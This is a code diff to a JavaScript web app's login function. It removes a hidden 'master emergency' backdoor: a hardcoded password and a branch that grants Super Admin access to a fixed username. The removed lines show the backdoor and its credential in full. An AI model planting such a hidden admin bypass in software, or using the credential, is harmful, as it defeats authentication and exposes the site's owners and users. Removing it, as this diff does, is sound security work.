@@ -5918,8 +5918,6 @@
       return null;
     }
 
-    // Master emergency reset hatch — never shown in UI
-    const MASTER_RESET_PASSWORD = "Raja123$";
     const DEFAULT_LOGO_SVG = `data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%23001845'/><circle cx='50' cy='50' r='30' fill='none' stroke='%23ffffff' stroke-width='6'/><circle cx='43' cy='50' r='23' fill='none' stroke='%23ffffff' stroke-width='6'/></svg>`;
 
     function getFullImageUrl(url) {
@@ -6013,16 +6011,12 @@
 
     // Returns matching user from dynamic user directory, or null
     function resolveCredentials(username, password) {
-      // 1. Check dynamic user directory first
+      // Check dynamic user directory
       const dynUser = state.users.find(u => u.username.toLowerCase() === username.toLowerCase());
       if (dynUser) {
         if (dynUser.status === 'suspended') return { blocked: true, name: dynUser.name };
         if (verifyPassword(password, dynUser.password)) return { match: true, ...dynUser };
         return null;
-      }
-      // 2. Master emergency admin hatch
-      if (username.toLowerCase() === 'raja1992' && password === MASTER_RESET_PASSWORD) {
-        return { match: true, id: 'admin-master', username: 'Raja1992', name: 'Raja Super Admin', role: 'Super Admin', category: 'super admin', email: '', status: 'active' };
       }
       return null;
     }
